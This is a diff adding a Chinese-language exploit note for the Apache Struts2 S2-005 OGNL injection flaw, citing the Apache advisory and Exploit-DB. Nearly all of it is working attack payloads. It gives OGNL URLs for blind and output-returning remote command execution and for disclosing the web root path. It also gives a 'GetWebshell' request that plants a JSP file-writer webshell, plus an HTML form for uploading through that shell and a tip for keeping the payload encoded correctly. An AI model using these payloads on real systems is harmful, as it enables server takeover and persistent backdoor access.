@@ -1,0 +1,31 @@
+REF：http://struts.apache.org/docs/s2-005.html
+REF：https://www.exploit-db.com/exploits/14360/
+
+
+通过修改一些值能够调用被保护的Java代码，并且执行任意的Java代码：
+#_memberAccess['allowStaticMethodAccess'] = true
+#foo = new java .lang.Boolean("false")
+#context['xwork.MethodAccessor.denyMethodExecution'] = #foo
+#rt = @java.lang.Runtime@getRuntime()
+#rt.exec('mkdir /tmp/PWNED')
+通过构造http请求能够调用该OGNL的表达式，这个漏洞的PoC于2010年7月12日发布。
+
+十六进制 \u0023   或 八进制 \43    转义为#
+
+不可回显EXP
+http://Domain/[filename].action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew java.lang.Boolean("false")))&(asdf)(('\u0023rt.exec("系统命令")')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1
+
+可回显EXP
+http://Domain/[filename].action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'系统命令\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
+
+网站路径
+http://Domain/[filename].action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43x\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43x\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43x.getWriter().println(\43req.getRealPath("\u005c"))')(d))&(i99)(('\43x.getWriter().close()')(d))
+
+GetWebshell
+http://Domain/[filename].action?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew java.lang.Boolean("false")))&(adsdf)((@java.lang.System@err.close()))&(asdf)((\u0023rt\u003d@java.lang.System@setErr(new java.io.PrintStream(new java.io.File(@java.net.URLDecoder@decode(@ognl.Ognl@class.getResource('/').getFile())).getParentFile().getParent()+'/1.jsp')))(@java.lang.System@err.println("\u003c\u0025java.io.FileWriter w \u003d new java.io.FileWriter(application.getRealPath(\"2.jsp\"));w.write(request.getParameter(\"c\"));w.close();\u0025\u003e")))=1
+由于新浪微博过滤问题，原来的 %2b （无空格）已经被转化成 + ，修改回来即可。
+<form name=get method=post>
+<input name=url size=100 type=text value=http://>
+<input type=button onclick="javascript:get.action=document.get.url.value;get.submit()" value=ok>
+<br><textarea name=c rows=20 cols=100></textarea><br>
+</form>
